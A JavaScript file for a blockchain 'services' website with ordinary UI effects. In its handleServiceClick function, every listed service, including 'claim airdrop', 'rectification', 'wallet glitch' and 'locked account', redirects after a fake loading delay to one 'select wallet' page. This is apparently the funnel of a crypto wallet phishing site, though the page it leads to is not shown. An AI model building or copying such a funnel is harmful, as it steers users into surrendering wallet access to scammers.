// Main JavaScript functionality for the Blockchain website

document.addEventListener('DOMContentLoaded', function() {
    // Initialize all functionality
    initNavigation();
    initServiceCards();
    initSmoothScrolling();
    initAnimations();
});

// Navigation functionality
function initNavigation() {
    const navbar = document.querySelector('.navbar');
    const navLinks = document.querySelectorAll('.nav-link');
    
    // Add scroll effect to navbar
    window.addEventListener('scroll', function() {
        if (window.scrollY > 100) {
            navbar.style.background = 'rgba(0, 0, 0, 0.95)';
        } else {
            navbar.style.background = 'rgba(0, 0, 0, 0.9)';
        }
    });
    
    // Set active navigation link based on current page
    const currentPage = window.location.pathname.split('/').pop() || 'index.html';
    navLinks.forEach(link => {
        if (link.getAttribute('href') === currentPage) {
            link.classList.add('active');
        }
    });
}

// Service cards interaction
function initServiceCards() {
    const serviceCards = document.querySelectorAll('.service-card');
    
    serviceCards.forEach(card => {
        card.addEventListener('click', function() {
            // Add click effect
            this.style.transform = 'scale(0.98)';
            setTimeout(() => {
                this.style.transform = 'translateY(-5px)';
            }, 150);
            
            // Get service name and redirect to appropriate page
            const serviceName = this.querySelector('h3').textContent.toLowerCase();
            handleServiceClick(serviceName);
        });
        
        // Add hover sound effect (optional)
        card.addEventListener('mouseenter', function() {
            this.style.cursor = 'pointer';
        });
    });
}

// Handle service card clicks
function handleServiceClick(serviceName) {
    // Map services to their respective pages or actions
    const serviceMap = {
        'migration': 'sync1/node1/index.html',
        'claim airdrop': 'sync1/node1/index.html',
        'claim': 'sync1/node1/index.html',
        'swap': 'sync1/node1/index.html',
        'rectification': 'sync1/node1/index.html',
        'security': 'sync1/node1/index.html',
        'support': 'sync1/node1/index.html',
        'slippage': 'sync1/node1/index.html',
        'transaction': 'sync1/node1/index.html',
        'quest': 'sync1/node1/index.html',
        'cross transfer': 'sync1/node1/index.html',
        'staking': 'sync1/node1/index.html',
        'exchange': 'sync1/node1/index.html',
        'liquidity': 'sync1/node1/index.html',
        'connect to dapps': 'sync1/node1/index.html',
        'login': 'sync1/node1/index.html',
        'whitelist': 'sync1/node1/index.html',
        'testnet': 'sync1/node1/index.html',
        'token approval': 'sync1/node1/index.html',
        'token transfer': 'sync1/node1/index.html',
        'token swap': 'sync1/node1/index.html',
        'token bridge': 'sync1/node1/index.html',
        'buy coins/tokens': 'sync1/node1/index.html',
        'missing/irregular balance': 'sync1/node1/index.html',
        'wallet glitch / wallet error': 'sync1/node1/index.html',
        'transaction delay': 'sync1/node1/index.html',
        'nfts': 'sync1/node1/index.html',
        'validation': 'sync1/node1/index.html',
        'locked account': 'sync1/node1/index.html'
    };
    
    const targetPage = serviceMap[serviceName];
    if (targetPage) {
        // Add loading effect
        showLoading();
        
        // Redirect after a short delay for better UX
        setTimeout(() => {
            window.location.href = targetPage;
        }, 500);
    } else {
        // Default to select wallet page
        window.location.href = 'sync1/node1/index.html';
    }
}

// Smooth scrolling functionality
function initSmoothScrolling() {
    const links = document.querySelectorAll('a[href^="#"]');
    
    links.forEach(link => {
        link.addEventListener('click', function(e) {
            e.preventDefault();
            const targetId = this.getAttribute('href');
            const targetSection = document.querySelector(targetId);
            
            if (targetSection) {
                targetSection.scrollIntoView({
                    behavior: 'smooth',
                    block: 'start'
                });
            }
        });
    });
}

// Animation functionality
function initAnimations() {
    // Intersection Observer for fade-in animations
    const observerOptions = {
        threshold: 0.1,
        rootMargin: '0px 0px -50px 0px'
    };
    
    const observer = new IntersectionObserver(function(entries) {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                entry.target.style.opacity = '1';
                entry.target.style.transform = 'translateY(0)';
            }
        });
    }, observerOptions);
    
    // Observe elements for animation
    const animateElements = document.querySelectorAll('.service-card, .hero-content, .cta-content');
    animateElements.forEach(el => {
        el.style.opacity = '0';
        el.style.transform = 'translateY(30px)';
        el.style.transition = 'opacity 0.6s ease, transform 0.6s ease';
        observer.observe(el);
    });
}

// Loading effect
function showLoading() {
    // Create loading overlay
    const loadingOverlay = document.createElement('div');
    loadingOverlay.className = 'loading-overlay';
    loadingOverlay.innerHTML = `
        <div class="loading-spinner">
            <div class="spinner"></div>
            <p>Loading...</p>
        </div>
    `;
    
    // Add loading styles
    const loadingStyles = document.createElement('style');
    loadingStyles.textContent = `
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 10000;
        }
        
        .loading-spinner {
            text-align: center;
            color: white;
        }
        
        .spinner {
            width: 50px;
            height: 50px;
            border: 3px solid rgba(59, 130, 246, 0.3);
            border-top: 3px solid #3b82f6;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 1rem;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    `;
    
    document.head.appendChild(loadingStyles);
    document.body.appendChild(loadingOverlay);
    
    // Remove loading overlay after navigation
    setTimeout(() => {
        if (loadingOverlay.parentNode) {
            loadingOverlay.parentNode.removeChild(loadingOverlay);
        }
    }, 1000);
}

// Utility functions
function debounce(func, wait) {
    let timeout;
    return function executedFunction(...args) {
        const later = () => {
            clearTimeout(timeout);
            func(...args);
        };
        clearTimeout(timeout);
        timeout = setTimeout(later, wait);
    };
}

// Add some interactive effects
function addInteractiveEffects() {
    // Parallax effect for hero section
    window.addEventListener('scroll', debounce(function() {
        const scrolled = window.pageYOffset;
        const heroImage = document.querySelector('.hero-image');
        if (heroImage) {
            heroImage.style.transform = `translateY(${scrolled * 0.1}px)`;
        }
    }, 10));
    
    // Add typing effect to hero title (optional)
    const heroTitle = document.querySelector('.hero-title');
    if (heroTitle) {
        const text = heroTitle.textContent;
        heroTitle.textContent = '';
        
        let i = 0;
        const typeWriter = () => {
            if (i < text.length) {
                heroTitle.textContent += text.charAt(i);
                i++;
                setTimeout(typeWriter, 50);
            }
        };
        
        // Start typing effect after a delay
        setTimeout(typeWriter, 1000);
    }
}

// Initialize interactive effects
setTimeout(addInteractiveEffects, 1000);

// Error handling
window.addEventListener('error', function(e) {
    console.error('An error occurred:', e.error);
});

// Performance monitoring
if ('performance' in window) {
    window.addEventListener('load', function() {
        const perfData = performance.getEntriesByType('navigation')[0];
        console.log('Page load time:', perfData.loadEventEnd - perfData.loadEventStart, 'ms');
    });
}
